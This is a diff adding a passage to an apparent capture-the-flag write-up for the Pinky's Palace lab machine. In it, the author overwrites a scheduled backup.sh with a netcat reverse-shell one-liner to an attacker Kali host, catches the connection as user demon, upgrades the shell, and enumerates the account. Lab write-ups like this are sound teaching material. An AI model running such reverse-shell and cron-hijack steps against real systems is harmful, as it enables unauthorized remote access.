@@ -854,4 +854,46 @@ tar cvzf /home/demon/backups/backup.tar.gz /var/www/html
 #
 ```
 
+## Demon Reverse Shell using Backup.sh
+
+By editing the `Backup.sh` file, we can trigger a reverse shell from the Demon account.
+```
+pinky@Pinkys-Palace:/usr/local/bin$ echo nc -nv 192.168.225.129 443 -e /bin/bash >backup.sh
+pinky@Pinkys-Palace:/usr/local/bin$ cat backup.sh
+nc -nv 192.168.225.129 443 -e /bin/bash
+```
+
+I wasn't sure how the backup.sh script was triggered, but I started my reverse shell on Kali.  As luck would have it, within about a minute the Demon account reached out to connect to my Kali box.
+```
+root@kali:~# nc -nlvp 443
+listening on [any] 443 ...
+connect to [192.168.225.129] from (UNKNOWN) [192.168.225.130] 37492
+id
+uid=1001(demon) gid=1001(demon) groups=1001(demon)
+```
+
+## Enumeration of the Demon user
+
+Not many users left now... feeling pretty close to root.  Now to fix this shell and enumerate.
+```
+python -c "import pty; pty.spawn('/bin/bash')"
+demon@Pinkys-Palace:~$ id
+id
+uid=1001(demon) gid=1001(demon) groups=1001(demon)
+demon@Pinkys-Palace:~$ cd /home/demon
+cd /home/demon
+demon@Pinkys-Palace:~$ ls
+ls
+backups
+demon@Pinkys-Palace:~$ ls -la   
+ls -la
+total 24
+drwxr-x--- 3 demon demon 4096 Mar 17 20:02 .
+drwxr-xr-x 5 root  root  4096 Mar 17 15:20 ..
+drwxr-xr-x 2 demon demon 4096 Apr 22 12:35 backups
+lrwxrwxrwx 1 root  root     9 Mar 17 20:02 .bash_history -> /dev/null
+-rw-r--r-- 1 demon demon  220 May 15  2017 .bash_logout
+-rw-r--r-- 1 demon demon 3526 May 15  2017 .bashrc
+lrwxrwxrwx 1 root  root     9 Mar 17 20:02 .mysql_history -> /dev/null
+-rw-r--r-- 1 demon demon  675 May 15  2017 .profile
 ```
